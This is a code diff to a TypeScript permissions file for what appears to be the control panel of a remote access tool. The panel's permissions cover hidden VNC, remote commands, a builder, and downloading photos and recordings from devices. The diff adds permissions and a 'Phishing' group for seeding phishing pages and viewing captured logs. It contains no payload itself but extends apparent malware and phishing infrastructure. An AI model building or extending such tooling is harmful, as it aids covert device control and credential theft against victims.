@@ -53,7 +53,9 @@ export type Permission =
   | 'settings:view'
   | 'settings:edit'
   | 'stats:view'
-  | 'files:download';
+  | 'files:download'
+  | 'phishing:view'    // [FIX] ADDED
+  | 'phishing:manage'; // [FIX] ADDED
 
 export const ALL_PERMISSIONS: Permission[] = [
   'dashboard:view', 'device:view',
@@ -65,6 +67,7 @@ export const ALL_PERMISSIONS: Permission[] = [
   'device:command', 'device:delete',
   'builder:access', 'logs:view', 'logs:clear', 'users:manage',
   'settings:view', 'settings:edit', 'stats:view', 'files:download',
+  'phishing:view', 'phishing:manage', // [FIX] ADDED
 ];
 
 export const DEFAULT_USER_PERMISSIONS: Permission[] = [
@@ -76,6 +79,7 @@ export const DEFAULT_USER_PERMISSIONS: Permission[] = [
   'device:hvnc', 'device:inspector',
   'device:command',
   'settings:view',
+  'phishing:view', // [FIX] ADDED — manage is admin-grantable only
 ];
 
 export const PERMISSION_GROUPS = [
@@ -118,6 +122,14 @@ export const PERMISSION_GROUPS = [
       { key: 'settings:edit' as Permission, label: 'Edit Settings', description: 'Modify system configuration' },
       { key: 'stats:view' as Permission, label: 'View Statistics', description: 'Access system statistics' },
       { key: 'files:download' as Permission, label: 'Download Files', description: 'Download photos, recordings, and files from devices' },
+    ],
+  },
+  { // [FIX] ADDED — Phishing group, same structure as the other two
+    label: 'Phishing',
+    icon: 'ShieldAlert' as const,
+    permissions: [
+      { key: 'phishing:view' as Permission, label: 'View Phishing', description: 'View phishing pages, captured logs, and statistics' },
+      { key: 'phishing:manage' as Permission, label: 'Manage Phishing', description: 'Seed, toggle, and delete phishing pages, clear capture logs' },
     ],
   },
 ];
